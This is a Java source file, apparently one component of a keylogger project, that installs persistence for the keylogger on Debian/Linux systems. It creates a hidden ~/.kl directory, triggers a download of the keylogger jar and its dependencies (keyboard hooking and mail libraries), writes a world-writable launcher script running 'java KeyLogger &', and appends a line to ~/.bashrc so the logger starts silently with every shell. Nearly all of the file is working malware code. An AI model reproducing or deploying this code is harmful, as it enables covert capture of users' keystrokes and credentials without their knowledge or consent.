/*
 *  Debian.java
 *  
 *  @Authors: Niklas Adolfsson and Alexander Persson
 *  @Date: 2016-05-12
 *  
 *  A class that 
 *    - creates a bash script in that is executable by all users by chmod 4777
 *      and writes the following contents:
 *       #!/bin/sh
 *       export CLASSPATH=".:$HOME/.kl/KeyLogger.jar:$HOME/.kl/jnativehook-2.0.3.jar:$HOME/.kl/javax.mail.jar:/$HOME/.kl/mail-1.4.7.jar"
 *       java KeyLogger &
 *    - creates .bashrc if it doesn't exist
 *    - add one line in .bashrc to load the bash script each time bash is loaded
 *    - Download dependencies
 *  
 */

import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.nio.charset.Charset;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardOpenOption;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;

public class Debian 
{
	  private String homedir;
	  private String bashFile;
	  private String keyloggerDir;
	  private String bashrcPath;
	  private String command;

	  
	  public Debian()
	  {
	    homedir = System.getProperties().getProperty("user.home");
	    keyloggerDir = homedir + File.separator + ".kl";
	    bashFile = keyloggerDir + File.separator + "java.sh";
	    bashrcPath = homedir + File.separator + ".bashrc";
	    command = "source " + bashFile;
	    
	    File f = null;
	    try 
	    {
	      f = new File(keyloggerDir);
	      f.mkdir();
	    }
	    catch (Exception e)
	    {
	      e.printStackTrace();
	    }
	    Download obj = new Download(keyloggerDir);
	    this.createBootScript();
	  }

	  public void createBootScript()
	  {

	    this.createBashScript(); 
	    File file=new File(".");
	    System.setProperty("user.dir", homedir);
	    File hdir = new File(homedir);
	    File [] flist = hdir.listFiles();
	    boolean bashrc = false;
	    Charset utf8 = StandardCharsets.UTF_8;
	    for ( File f : flist)
	    {
	      if ( f.getName().toLowerCase().equals(".bashrc") )
	      {
	        bashrc = true;
	      }
	    }
	    
	    /* create .bashrc */
	    if ( !bashrc )
	    {
	      List<String> lines = Arrays.asList(command);
	      try
	      {
	        Files.write(Paths.get(bashrcPath), lines, utf8, StandardOpenOption.CREATE);
	      }
	      catch (Exception e)
	      {
	        e.printStackTrace();
	      }
	    }
	    
	    else
	    {
	    	String line = null;
	    	boolean commandFound = false;
	    	try 
	    	 {
	    		Path f = Paths.get(bashrcPath);
	    		BufferedReader reader = Files.newBufferedReader(f, Charset.defaultCharset());
	    		while ((line = reader.readLine()) != null) 
	    		{
	    			if ( line.toLowerCase().contains(command))
	    			{
	    				commandFound = true;
	    			}
	    	    }
	            reader.close();         
	         }
	        catch(Exception e) 
	    	{
	             e.printStackTrace();            
	         }
	    	if (!commandFound)
	    	{
	    		  List<String> lines = Arrays.asList("\n", "source " + bashFile);
	    	      try 
	    	      {
	    	    	  Files.write(Paths.get(bashrcPath), lines, utf8, StandardOpenOption.APPEND);
	    	      } 
	    	      catch (IOException e) 
	    	      {
	    	          e.printStackTrace();
	    	      }
	    	    }
	    	}
	    
	  }

	  
	  public void createBashScript()
	  {
	    Charset utf8 = StandardCharsets.UTF_8;
	    List<String> lines = Arrays.asList
	    (
	                "#!/bin/sh", 
	                "export CLASSPATH=\".:$HOME/.kl/KeyLogger.jar:$HOME/.kl/jnativehook-2.0.3.jar:$HOME/.kl/javax.mail.jar:/$HOME/.kl/mail-1.4.7.jar\"",
	                "java KeyLogger &"
	    );
	    try
	    {
	      Files.write(Paths.get(bashFile), lines, utf8, StandardOpenOption.CREATE);
	      File file = new File (bashFile);
	      List<String> command = new ArrayList<String>();
	      command.add("chmod");
	      command.add("4777");
	      command.add(bashFile);
	      ProcessBuilder pb = new ProcessBuilder(command);
	      Process process = pb.start();
	      process.waitFor();
	    }
	    catch (Exception e)
	    {
	      e.printStackTrace();
	    }
	  }
  
}
